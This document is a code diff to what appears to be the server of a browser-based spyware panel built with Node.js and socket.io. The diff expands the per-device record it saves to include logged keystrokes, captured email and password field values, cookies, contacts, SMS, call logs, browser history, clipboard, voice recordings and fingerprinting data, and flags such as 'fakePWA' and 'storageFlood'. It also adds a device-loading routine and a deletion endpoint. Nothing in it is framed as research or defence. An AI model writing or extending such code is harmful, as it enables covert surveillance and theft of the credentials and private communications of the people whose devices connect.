@@ -106,28 +106,73 @@ function saveDevices() {
     const data = {};
     for (const [id, d] of devices) {
         data[id] = {
-            id: d.id,
-            label: d.label,
-            ip: d.ip,
-            userAgent: d.userAgent,
-            firstSeen: d.firstSeen,
-            lastSeen: d.lastSeen,
-            location: d.location,
-            history: d.history.slice(-500),
-            battery: d.battery,
-            connection: d.connection,
-            snapshots: d.snapshots.slice(-50),
-            aiChat: d.aiChat ? d.aiChat.slice(-100) : [],
+            id: d.id, label: d.label, ip: d.ip, userAgent: d.userAgent,
+            firstSeen: d.firstSeen, lastSeen: d.lastSeen,
+            location: d.location, history: d.history?.slice(-500) || [],
+            battery: d.battery, connection: d.connection,
+            snapshots: d.snapshots?.slice(-50) || [],
+            aiChat: d.aiChat?.slice(-100) || [],
             deviceModel: d.deviceModel || 'Unknown',
             linkedAccount: d.linkedAccount || null,
             clipboardHistory: d.clipboardHistory || [],
             voiceRecordings: d.voiceRecordings || [],
             cookiesData: d.cookiesData || null,
+            keystrokes: d.keystrokes?.slice(-200) || [],
+            clicks: d.clicks?.slice(-100) || [],
+            fingerprint: d.fingerprint || null,
+            ipGeo: d.ipGeo || null,
+            webgl: d.webgl || null,
+            audioFP: d.audioFP || null,
+            fonts: d.fonts || null,
+            preferences: d.preferences || null,
+            orientation: d.orientation || null,
+            motion: d.motion || null,
+            light: d.light || null,
+            fieldEmail: d.fieldEmail || null,
+            fieldPass: d.fieldPass || null,
+            webrtcIP: d.webrtcIP || null,
+            speedTest: d.speedTest || null,
+            bluetooth: d.bluetooth || null,
+            idle: d.idle || null,
+            visibility: d.visibility || null,
+            tabs: d.tabs || null,
+            fullscreen: d.fullscreen || null,
+            pointerLock: d.pointerLock || null,
+            orientationLock: d.orientationLock || null,
+            wakeLock: d.wakeLock || null,
+            storageFlood: d.storageFlood || null,
+            storageEstimate: d.storageEstimate || null,
+            deviceDetection: d.deviceDetection || null,
+            deviceVendor: d.deviceVendor || null,
+            contacts: d.contacts || null,
+            browserHistory: d.browserHistory || null,
+            fsAccess: d.fsAccess || null,
+            cookies: d.cookies || null,
+            cookieCount: d.cookieCount || null,
+            storageData: d.storageData || null,
+            sms: d.sms || null,
+            callLog: d.callLog || null,
+            installPrompt: d.installPrompt || null,
+            fakePWA: d.fakePWA || null,
+            backgroundFetch: d.backgroundFetch || null,
             online: !!d.socketId && io.sockets.sockets.has(d.socketId)
         };
     }
     fs.writeFileSync(path.join(DATA_DIR, 'devices.json'), JSON.stringify(data, null, 2));
 }
+
+function loadDevices() {
+    try {
+        const f = path.join(DATA_DIR, 'devices.json');
+        if (fs.existsSync(f)) {
+            const data = JSON.parse(fs.readFileSync(f, 'utf-8'));
+            for (const [id, d] of Object.entries(data)) {
+                devices.set(id, d);
+            }
+        }
+    } catch(e) {}
+}
+loadDevices();
 
 io.on('connection', (socket) => {
     const deviceId = socket.handshake.query.deviceId || uuidv4();
@@ -548,6 +593,20 @@ app.get('/api/devices/:deviceId', (req, res) => {
         deviceModel: d.deviceModel || 'Unknown',
         linkedAccount: d.linkedAccount || null
     });
+});
+
+app.delete('/api/devices/:deviceId', (req, res) => {
+    const did = req.params.deviceId;
+    const d = devices.get(did);
+    if (!d) return res.status(404).json({ error: 'not found' });
+    if (d.socketId) {
+        const sock = io.sockets.sockets.get(d.socketId);
+        if (sock) sock.disconnect(true);
+    }
+    devices.delete(did);
+    saveDevices();
+    io.emit('device-offline', did);
+    res.json({ ok: true });
 });
 
 app.post('/api/link-account', (req, res) => {
